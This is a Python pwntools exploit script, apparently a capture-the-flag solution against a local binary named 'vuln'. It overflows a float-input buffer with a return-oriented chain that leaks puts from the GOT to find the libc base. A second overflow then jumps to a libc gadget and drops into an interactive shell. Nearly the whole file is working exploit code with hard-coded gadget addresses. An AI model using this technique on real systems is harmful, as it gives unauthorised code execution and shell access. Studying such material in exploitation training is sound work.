#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=127.0.0.1'
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './vuln'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4141)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    global libc
    #libc = ELF("/usr/lib/libc.so.6")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    global libc
    libc = ELF("./libc.so.6")
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

def byte_to_float(data):
    return str(struct.unpack('d', bytes(data))[0])

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

pop_pop_ret = 0x0000000000400840 #: pop r14; pop r15; ret;
pop_rdi = 0x0000000000400843 # pop rdi; ret;
ret = 0x000000000040055e #: ret;

puts_got = 0x601018
puts_plt = 0x400570
vuln = 0x4006a7

io = start()

io.recvuntil(': ')
io.sendline('-1')

io.recvuntil(':\n')

#input()

for i in range(97):
  io.sendline(byte_to_float(b'AAAAAAAA'))

io.sendline(byte_to_float(p64(0x62)))

io.sendline(byte_to_float(p64(pop_rdi)))
io.sendline(byte_to_float(p64(puts_got)))
io.sendline(byte_to_float(p64(puts_plt)))
io.sendline(byte_to_float(p64(pop_rdi)))
io.sendline(byte_to_float(p64(0xdeadbeef)))
io.sendline(byte_to_float(p64(vuln)))

for i in range(24):
  io.sendline(byte_to_float(b'AAAAAAAA'))

leak = u64(io.recv(6).ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']

log.success(f'LEAK: {hex(leak)}')
log.success(f'LIBC: {hex(libc_base)}')

binsh = next(libc.search(b'/bin/sh\0')) + libc_base
system = libc.symbols['system'] + libc_base

io.recvuntil(': ')
io.sendline('-1')

io.recvuntil(':\n')

#input()

for i in range(97):
  io.sendline(byte_to_float(b'CCCCCCCC'))

io.sendline(byte_to_float(p64(0x62)))

io.sendline(byte_to_float(p64(0x4f432 + libc_base)))

for i in range(28):
  io.sendline(byte_to_float(p64(0x0)))

io.interactive()

